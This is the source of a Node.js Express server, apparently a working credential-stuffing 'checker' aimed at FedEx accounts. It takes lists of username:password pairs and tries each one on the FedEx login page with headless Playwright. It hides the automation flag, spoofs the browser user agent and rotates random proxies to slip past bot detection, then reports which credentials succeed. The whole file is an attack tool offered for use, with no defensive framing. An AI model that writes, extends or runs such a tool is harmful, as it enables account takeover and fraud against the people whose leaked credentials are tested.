require('dotenv').config();
const express = require('express');
const { chromium } = require('playwright');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

async function tryLogin(userId, password, proxy) {
  let browser;
  try {
    const launchOpts = {
      headless: true,
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-gpu',
        '--disable-blink-features=AutomationControlled'
      ]
    };
    if (proxy) {
      const [host, port] = proxy.split(':');
      launchOpts.args.push(`--proxy-server=${host}:${port}`);
    }

    browser = await chromium.launch(launchOpts);
    const context = await browser.newContext({
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      ignoreHTTPSErrors: true,
      viewport: { width: 1366, height: 768 },
      locale: 'en-GB'
    });
    await context.addInitScript(() => {
      Object.defineProperty(navigator, 'webdriver', { get: () => false });
    });
    const page = await context.newPage();

    await page.goto('https://www.fedex.com/secure-login/en-gb/#/credentials', {
      waitUntil: 'domcontentloaded',
      timeout: 30000
    });
    await page.waitForTimeout(3000);

    try {
      const cookieBtn = page.locator('button:has-text("ACCEPT ALL COOKIES")');
      if (await cookieBtn.isVisible({ timeout: 3000 })) {
        await cookieBtn.click();
        await page.waitForTimeout(1000);
      }
    } catch {}

    // Try multiple selectors for the user ID field
    let userField;
    try {
      userField = page.locator('#username');
      await userField.waitFor({ state: 'visible', timeout: 15000 });
    } catch {
      try {
        userField = page.locator('input[formcontrolname="userId"]');
        await userField.waitFor({ state: 'visible', timeout: 5000 });
      } catch {
        userField = page.locator('input[type="text"]').first();
        await userField.waitFor({ state: 'visible', timeout: 5000 });
      }
    }

    await userField.fill(userId);
    await page.locator('input[type="password"]').first().fill(password);
    await page.locator('#login_button').click();
    await page.waitForTimeout(5000);

    const currentUrl = page.url();
    const pageTitle = await page.title();
    const isLoggedIn = !currentUrl.includes('/credentials') && !currentUrl.includes('secure-login');
    console.log(`Login attempt: ${userId} -> ${isLoggedIn ? 'SUCCESS' : 'FAIL'} | URL: ${currentUrl} | Title: ${pageTitle}`);

    await browser.close();

    return {
      success: isLoggedIn,
      redirectedTo: currentUrl,
      proxy: proxy || 'direct'
    };
  } catch (err) {
    if (browser) await browser.close().catch(() => {});
    return {
      success: false,
      error: err.message,
      proxy: proxy || 'direct'
    };
  }
}

app.post('/api/check', async (req, res) => {
  const { accounts, proxies } = req.body;

  if (!accounts || !accounts.length) {
    return res.status(400).json({ error: 'No accounts provided' });
  }

  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'X-Accel-Buffering': 'no'
  });

  const proxyList = proxies || [];
  const results = { success: [], dead: [] };

  for (let i = 0; i < accounts.length; i++) {
    const line = accounts[i].trim();
    if (!line || !line.includes(':')) continue;

    const colonIdx = line.indexOf(':');
    const userId = line.substring(0, colonIdx).trim();
    const password = line.substring(colonIdx + 1).trim();

    if (!userId || !password) continue;

    const proxy = proxyList.length > 0
      ? proxyList[Math.floor(Math.random() * proxyList.length)].trim()
      : null;

    const result = await tryLogin(userId, password, proxy);

    const entry = {
      user: userId,
      pass: password,
      proxy: result.proxy,
      url: result.redirectedTo || '',
      error: result.error || ''
    };

    if (result.success) {
      results.success.push(entry);
    } else {
      results.dead.push(entry);
    }

    res.write(`data: ${JSON.stringify({
      type: 'progress',
      index: i + 1,
      total: accounts.length,
      result: result.success ? 'success' : 'dead',
      entry
    })}\n\n`);
  }

  res.write(`data: ${JSON.stringify({
    type: 'done',
    total: accounts.length,
    successCount: results.success.length,
    deadCount: results.dead.length,
    results
  })}\n\n`);

  res.end();
});

app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

app.listen(PORT, () => {
  console.log(`FedServer running on port ${PORT}`);
});
